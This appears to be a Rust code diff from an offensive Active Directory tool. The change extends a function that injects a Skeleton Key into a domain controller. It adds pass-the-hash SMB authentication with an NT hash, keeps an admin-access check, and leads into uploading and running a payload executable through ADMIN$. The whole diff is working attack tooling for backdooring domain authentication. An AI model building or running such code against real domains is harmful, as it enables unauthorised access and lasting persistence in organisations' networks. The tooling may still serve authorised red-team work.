@@ -41,14 +41,29 @@ use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};
 pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[skeleton] Skeleton Key injection against {}", config.dc_ip);
 
-    // Validate credentials
-    let password = match (&config.password, &config.nt_hash) {
-        (Some(pw), _) => pw.clone(),
-        (None, Some(_hash)) => {
-            // TODO: PTH authentication when SmbSession supports it
-            return Err(OverthroneError::TicketForge(
-                "Pass-the-hash SMB auth not yet implemented; supply a plaintext password".into(),
-            ));
+    // Validate credentials and establish SMB session
+    let smb = match (&config.password, &config.nt_hash) {
+        (Some(pw), _) => {
+            info!("[skeleton] Connecting to {} via SMB (password)", config.dc_ip);
+            SmbSession::connect(&config.dc_ip, &config.domain, &config.username, pw)
+                .await
+                .map_err(|e| {
+                    OverthroneError::TicketForge(format!(
+                        "SMB connect to {} failed: {e}",
+                        config.dc_ip
+                    ))
+                })?
+        }
+        (None, Some(hash)) => {
+            info!("[skeleton] Connecting to {} via SMB (pass-the-hash)", config.dc_ip);
+            SmbSession::connect_with_hash(&config.dc_ip, &config.domain, &config.username, hash)
+                .await
+                .map_err(|e| {
+                    OverthroneError::TicketForge(format!(
+                        "SMB PTH connect to {} failed: {e}",
+                        config.dc_ip
+                    ))
+                })?
         }
         _ => {
             return Err(OverthroneError::TicketForge(
@@ -66,18 +81,7 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         hex::encode(&master_hash)
     );
 
-    // ── Step 1: Connect to DC via SMB ───────────────────────────
-    info!("[skeleton] Connecting to {} via SMB", config.dc_ip);
-    let smb = SmbSession::connect(&config.dc_ip, &config.domain, &config.username, &password)
-        .await
-        .map_err(|e| {
-            OverthroneError::TicketForge(format!(
-                "SMB connect to {} failed: {e}",
-                config.dc_ip
-            ))
-        })?;
-
-    // ── Step 2: Verify admin access ─────────────────────────────
+    // ── Step 1: Verify admin access ────────────────────────────
     info!("[skeleton] Verifying admin access on {}", config.dc_ip);
     let admin_check = smb.check_admin_access().await;
     if !admin_check.has_admin {
@@ -91,7 +95,7 @@ pub async fn inject_skeleton_key(config: &ForgeConfig) -> Result<ForgeResult> {
         config.dc_ip, admin_check.accessible_shares
     );
 
-    // ── Step 3: Upload & execute payload, or dry-run ────────────
+    // ── Step 2: Upload & execute payload, or dry-run ────────────
     let (output, executed) = match &config.payload_path {
         Some(payload_path) => {
             // Upload payload to ADMIN$\Temp\<random>.exe
